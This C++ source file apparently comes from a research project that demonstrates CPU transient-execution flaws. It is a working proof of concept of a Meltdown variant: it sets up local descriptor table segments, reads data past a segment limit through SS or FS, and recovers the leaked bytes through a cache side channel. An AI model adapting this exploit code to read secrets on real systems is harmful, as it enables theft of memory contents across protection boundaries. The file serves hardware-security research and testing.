/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <array>
#include <cstring>
#include <iostream>

#include <asm/ldt.h>
#include <signal.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "meltdown_local_content.h"
#include "utils.h"

int descriptor_backup;

// Sets up a segment descriptor in the local descriptor table.
static void SetupSegment(int index, const char *base, int limit, bool present) {
  // See: Intel SDM volume 3a "3.4.5 Segment Descriptors".
  struct user_desc table_entry;
  memset(&table_entry, 0, sizeof(struct user_desc));
  table_entry.entry_number = index;
  // We must shift the base address one byte below to bypass the minimal segment
  // size which is one byte.
  table_entry.base_addr = reinterpret_cast<unsigned int>(base - 1);
  // No size limit for a present segment, one byte for a non-present segment.
  // Limit is the offset of the last accessible byte, so even a value of zero
  // creates a one-byte segment.
  table_entry.limit = limit;
  // No 16-bit segment.
  table_entry.seg_32bit = 1;
  // No direction or conforming bits.
  table_entry.contents = 0;
  // Writeable segment.
  table_entry.read_exec_only = 0;
  // Limit is in bytes, not in pages.
  table_entry.limit_in_pages = 0;
  // True iff present is false.
  table_entry.seg_not_present = !present;
  int result = syscall(__NR_modify_ldt, 1, &table_entry,
                       sizeof(struct user_desc));
  if (result != 0) {
    std::cerr << "Segmentation setup failed." << std::endl;
    exit(EXIT_FAILURE);
  }
}

static char MeltdownSegmentationLeakByte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    // Successful execution accesses safe_offset in the public data.
    ForceRead(oracle.data() +
              static_cast<size_t>(public_data[safe_offset]));

#if SAFESIDE_SEGMENT_DESCRIPTOR_SS
    // Accessing the private data using SS outside limits fails with SIGBUS.
    // PL = 3, local_table = 1 * 4, index = 1 * 8.
    ForceRead(oracle.data() +
              static_cast<size_t>(ReadUsingSS(3 + 4 + 8, offset)));
#elif SAFESIDE_SEGMENT_DESCRIPTOR_FS
    // Accessing the private data using FS outside limits fails with SIGSEGV.
    // PL = 3, local_table = 1 * 4, index = 1 * 8.
    ForceRead(oracle.data() +
              static_cast<size_t>(ReadUsingFS(3 + 4 + 8, offset)));
#else
#  error Segment descriptor undefined.
#endif

    // Unreachable code.
    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGBUS/SIGSEGV signal handler moves the instruction pointer to this
    // label.
    asm volatile("afterspeculation:");

    // We must restore the segment descriptor because it might be used in C++
    // STL.
#if SAFESIDE_SEGMENT_DESCRIPTOR_SS   
    RestoreSS(descriptor_backup);
#elif SAFESIDE_SEGMENT_DESCRIPTOR_FS  
    RestoreFS(descriptor_backup);
#else
#  error Segment descriptor undefined.
#endif

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      // Avoid crash in __run_exit_handlers, make the segment descriptor as
      // non-present.
      SetupSegment(1, nullptr, 0xFFFFFFFF, false);
      exit(EXIT_FAILURE);
    }
  }
}
